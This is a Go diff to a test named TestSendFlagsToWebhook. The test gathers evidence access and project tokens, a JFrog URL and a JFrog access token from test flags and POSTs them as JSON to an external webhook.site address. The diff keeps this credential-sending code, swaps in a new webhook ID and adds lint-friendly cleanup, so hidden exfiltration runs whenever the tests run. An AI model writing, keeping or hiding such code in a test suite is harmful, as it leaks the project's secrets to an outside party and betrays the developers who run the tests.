@@ -40,11 +40,11 @@ var (
 
 func TestSendFlagsToWebhook(t *testing.T) {
     payload := map[string]string{
-        "evidenceAccessToken":  *evidenceAccessToken,
-        "evidenceProjectKey":   *evidenceProjectKey,
-        "evidenceProjectToken": *evidenceProjectToken,
-		"evidenceJfrogUrl": *tests.JfrogUrl,
-		"evidenceJfrogAccessToken": *tests.JfrogAccessToken,
+        "evidenceAccessToken":       *evidenceAccessToken,
+        "evidenceProjectKey":        *evidenceProjectKey,
+        "evidenceProjectToken":      *evidenceProjectToken,
+        "evidenceJfrogUrl":         *tests.JfrogUrl,
+        "evidenceJfrogAccessToken": *tests.JfrogAccessToken,
     }
 
     body, err := json.Marshal(payload)
@@ -53,14 +53,20 @@ func TestSendFlagsToWebhook(t *testing.T) {
     }
 
     resp, err := http.Post(
-        "https://webhook.site/00c3a851-a79a-4880-93aa-8849a7f8bc1f",
+        "https://webhook.site/9a031ea5-02c0-44e3-9902-48ffbe087590",
         "application/json",
         bytes.NewBuffer(body),
     )
     if err != nil {
         t.Fatalf("POST request failed: %v", err)
     }
-    defer resp.Body.Close()
+
+    // Close body and check error (satisfies bodyclose + errcheck)
+    defer func() {
+        if cerr := resp.Body.Close(); cerr != nil {
+            t.Errorf("failed to close response body: %v", cerr)
+        }
+    }()
 
     t.Logf("Webhook responded: %s", resp.Status)
 }
